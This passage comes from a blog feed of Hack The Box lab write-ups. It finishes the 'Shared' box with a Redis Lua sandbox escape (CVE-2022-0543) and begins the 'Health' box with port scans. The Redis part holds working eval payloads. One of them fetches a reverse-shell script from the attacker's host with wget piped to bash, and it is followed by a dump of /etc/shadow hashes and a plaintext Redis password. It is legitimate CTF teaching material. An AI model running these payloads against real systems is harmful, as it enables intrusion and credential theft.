background-color: null;
font-style: inherit;">dan_smith@shared:/usr/local/bin$</span> redis-cli <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-h</span> localhost</span>
<span id="cb19-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">localhost:6379</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> AUTH default F2WHqJUz2WEz=Gqq</span>
<span id="cb19-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">OK</span></span></code></pre></div>
<p>Reading about redis on <a href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#lua-sandbox-bypass">HackTricks</a> we find an interesting CVE to escape from LUA. Trying to run the script on the victim fails because we’re lacking python3 module ‘redis’.</p>
<div class="sourceCode" id="cb20" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb20-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dan_smith@shared:/dev/shm$</span> python3 cve-2022-0543.py </span>
<span id="cb20-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Traceback</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">most</span> recent call last<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb20-3">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/dev/shm/cve-2022-0543.py"</span>, line 1, in <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>module<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb20-4">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">import</span> redis</span>
<span id="cb20-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ModuleNotFoundError:</span> No module named <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'redis'</span></span></code></pre></div>
<p>Instead, setup a SSH tunnel and test the script locally.</p>
<div class="sourceCode" id="cb21" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb21-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  shared ssh <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-L</span> 6379:127.0.0.1:6379 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-N</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> dan_smith@shared.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> dan-id_rsa</span>
<span id="cb21-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  shared python3 cve-2022-0543.py                                        </span>
<span id="cb21-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Please</span> input redis ip:</span>
<span id="cb21-4"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&gt;</span>127.0.0.1</span>
<span id="cb21-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Please</span> input redis port:</span>
<span id="cb21-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&gt;</span>6379</span>
<span id="cb21-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">input</span> exec cmd:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">q-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>exit<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb21-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&gt;</span>id</span>
<span id="cb21-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Traceback</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">most</span> recent call last<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb21-10">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/htb/shared/cve-2022-0543.py"</span>, line 30, in <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>module<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb21-11">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">shell</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ip,port,cmd</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb21-12">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/htb/shared/cve-2022-0543.py"</span>, line 19, in shell</span>
<span id="cb21-13">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">script</span> = r.eval<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lua,0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb21-14">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/usr/lib/python3/dist-packages/redis/client.py"</span>, line 3131, in eval</span>
<span id="cb21-15">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">self.execute_command</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'EVAL'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> script, numkeys, <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>keys_and_args<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb21-16">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/usr/lib/python3/dist-packages/redis/client.py"</span>, line 901, in execute_command</span>
<span id="cb21-17">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">self.parse_response</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">conn,</span> command_name, <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">**</span>options<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb21-18">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/usr/lib/python3/dist-packages/redis/client.py"</span>, line 915, in parse_response</span>
<span id="cb21-19">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">response</span> = connection.read_response<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb21-20">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/usr/lib/python3/dist-packages/redis/connection.py"</span>, line 739, in read_response</span>
<span id="cb21-21">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">response</span> = self._parser.read_response<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb21-22">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">File</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/usr/lib/python3/dist-packages/redis/connection.py"</span>, line 484, in read_response</span>
<span id="cb21-23">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">raise</span> response</span>
<span id="cb21-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">redis.exceptions.AuthenticationError:</span> Authentication required.</span></code></pre></div>
<p>Im not sure how to solve the code to include authentication, instead we can exploit it manually as there are two lines of code that actually does everything:</p>
<div class="sourceCode" id="cb22" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb22-1">line <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">17</span>: lua<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span>cmd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'", "r"); local res = f:read("*a"); f:close(); return res'</span></span>
<span id="cb22-2">line <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">19</span>: script <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> r.<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">eval</span>(lua,<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>)</span></code></pre></div>
<div class="sourceCode" id="cb23" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb23-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  shared redis-cli <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-h</span> 127.0.0.1 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--pass</span> F2WHqJUz2WEz=Gqq</span>
<span id="cb23-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">127.0.0.1:6379</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> eval <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res'</span> 0</span>
<span id="cb23-3"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uid=0(root) gid=0(root) groups=0(root)\n"</span></span>
<span id="cb23-4"></span>
<span id="cb23-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">127.0.0.1:6379</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> eval <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("wget -qO- http://10.10.14.4/rev.sh | bash", "r"); local res = f:read("*a"); f:close(); return res'</span> 0</span>
<span id="cb23-6"></span>
<span id="cb23-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  shared nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 443</span>
<span id="cb23-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 443 ...</span>
<span id="cb23-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.4</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.172]</span> 39640</span>
<span id="cb23-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> cannot set terminal process group <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">23806</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Inappropriate ioctl for device</span>
<span id="cb23-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> no job control in this shell</span>
<span id="cb23-12"></span>
<span id="cb23-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@shared:/var/lib/redis#</span> cat /root/root.txt</span>
<span id="cb23-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">4d6594a804436a9950d537695c81fecc</span></span>
<span id="cb23-15"></span>
<span id="cb23-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@shared:/var/lib/redis#</span> cat /etc/shadow</span>
<span id="cb23-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$y$j9T$q</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/qYCzzDEBdZXpRxCa6gL/</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$XhNZBD56JUTsCniDDjj6UmwRnBc3A40AcbtqNzVEpJ4</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:19186:0:99999:7:::</span></span>
<span id="cb23-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">daemon:*:19071:0:99999:7:::</span></span>
<span id="cb23-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bin:*:19071:0:99999:7:::</span></span>
<span id="cb23-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sys:*:19071:0:99999:7:::</span></span>
<span id="cb23-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sync:*:19071:0:99999:7:::</span></span>
<span id="cb23-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">games:*:19071:0:99999:7:::</span></span>
<span id="cb23-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">man:*:19071:0:99999:7:::</span></span>
<span id="cb23-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lp:*:19071:0:99999:7:::</span></span>
<span id="cb23-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mail:*:19071:0:99999:7:::</span></span>
<span id="cb23-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">news:*:19071:0:99999:7:::</span></span>
<span id="cb23-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uucp:*:19071:0:99999:7:::</span></span>
<span id="cb23-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">proxy:*:19071:0:99999:7:::</span></span>
<span id="cb23-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data:*:19071:0:99999:7:::</span></span>
<span id="cb23-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">backup:*:19071:0:99999:7:::</span></span>
<span id="cb23-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">list:*:19071:0:99999:7:::</span></span>
<span id="cb23-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">irc:*:19071:0:99999:7:::</span></span>
<span id="cb23-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gnats:*:19071:0:99999:7:::</span></span>
<span id="cb23-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">nobody:*:19071:0:99999:7:::</span></span>
<span id="cb23-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_apt:*:19071:0:99999:7:::</span></span>
<span id="cb23-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">systemd-timesync:*:19071:0:99999:7:::</span></span>
<span id="cb23-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">systemd-network:*:19071:0:99999:7:::</span></span>
<span id="cb23-38"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">systemd-resolve:*:19071:0:99999:7:::</span></span>
<span id="cb23-39"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">messagebus:*:19071:0:99999:7:::</span></span>
<span id="cb23-40"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sshd:*:19071:0:99999:7:::</span></span>
<span id="cb23-41"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$y$j9T$zJMiBXFlQaVLqD8B7hPR3</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ceN5vvW</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/KTMQ.YeNjqT8UVo6TsKm/Dl8P1uefK6v5A1:19071:0:99999:7:::</span></span>
<span id="cb23-42"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">systemd-coredump:!*:19071::::::</span></span>
<span id="cb23-43"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mysql:!:19071:0:99999:7:::</span></span>
<span id="cb23-44"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dan_smith:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$y$j9T$vFQT7yf8j9</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/liKFLt3fr7/</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$Fqyc1V0r3NrAH2JkdU6N6nEz1v5jm38wUUDbOkqZzsA</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:19186:0:99999:7:::</span></span>
<span id="cb23-45"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">redis:*:19071:0:99999:7:::</span></span>
<span id="cb23-46"></span>
<span id="cb23-47"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@shared:/var/lib/redis#</span> cat /root/.ssh/id_rsa</span>
<span id="cb23-48"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> /root/.ssh/id_rsa: No such file or directory</span></code></pre></div>


</section>
</section>

 ]]></description>
  <category>hackthebox</category>
  <category>linux</category>
  <category>prestashop</category>
  <category>sqli</category>
  <category>ipython</category>
  <category>redis</category>
  <category>cve-2022-0542</category>
  <category>tunneling</category>
  <guid>https://exploit.se/posts/2022-08-25-htb-writeup-shared/2022-08-25-htb-writeup-shared.html</guid>
  <pubDate>Thu, 25 Aug 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-08-25-htb-writeup-shared/images/shared_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Health - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-08-24-htb-writeup-health/2022-08-24-htb-writeup-health.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  ~ nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.129.9.180 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span></span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Starting</span> Nmap 7.92 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">https://nmap.org</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> 2022-08-23 09:17 CEST</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Initiating</span> Connect Scan at 09:17</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Scanning</span> 10.129.9.180 [65535 ports]</span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Discovered</span> open port 80/tcp on 10.129.9.180</span>
<span id="cb1-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Discovered</span> open port 22/tcp on 10.129.9.180</span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Completed</span> Connect Scan at 09:17, 10.64s elapsed <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">65535</span> total ports<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Nmap</span> scan report for 10.129.9.180</span>
<span id="cb1-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Host</span> is up <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.026s</span> latency<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb1-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> shown: 65532 closed tcp ports <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">conn-refused</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>     STATE    SERVICE</span>
<span id="cb1-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span>   open     ssh</span>
<span id="cb1-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span>   open     http</span>
<span id="cb1-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3000/tcp</span> filtered ppp</span>
<span id="cb1-15"></span>
<span id="cb1-16"></span>
<span id="cb1-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  ~ nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> 22,80,3000 10.129.9.180 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span></span>
<span id="cb1-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>     STATE    SERVICE VERSION</span>
<span id="cb1-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span>   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span> Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-20"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-21"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2048</span> 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-22"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-23"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span>   open     http    Apache httpd 2.4.29 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">))</span></span>
<span id="cb1-25"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Apache/2.4.29 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-26"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> HTTP Monitoring Tool</span>
<span id="cb1-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3000/tcp</span> filtered ppp</span>
<span id="cb1-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: OS: Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:linux:linux_kernel</span></code></pre></div>
<p>Visiting http://10.129.9.180 we find the domain <code>health.htb</code> in the footer, add it to <code>/etc/hosts</code>. The website allows us to configure a Webhook to check if a remote http service is available or not.</p>
<p><img src="https://exploit.se/posts/2022-08-24-htb-writeup-health/images/health01.png" class="img-fluid"></p>
<p>Most likely we should find a way to exploit the webhook service, however I’d like to check if there are any vulnerabilities present first. Looking at the source code we find hints that Laravel is running, verify this by running <code>webanalyze</code>. If it’s an older version we know that this might be exploitable to <em>“token Unserialize Remote Command Execution”</em> or RCE through Laravel’s debugging feature.</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  webanalyze ./webanalyze <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-host</span> http://health.htb</span>
<span id="cb2-2"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">::</span> webanalyze        : v1.0</span>
<span id="cb2-3"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">::</span> workers           : 4</span>
<span id="cb2-4"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">::</span> apps              : technologies.json</span>
<span id="cb2-5"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">::</span> crawl count       : 0</span>
<span id="cb2-6"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">::</span> search subdomains : true</span>
<span id="cb2-7"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">::</span> follow redirects  : false</span>
<span id="cb2-8"></span>
<span id="cb2-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://health.htb</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.1s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb2-10">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Apache,</span> 2.4.29 <span class="er" style="color: #AD0000;
background-color: null;
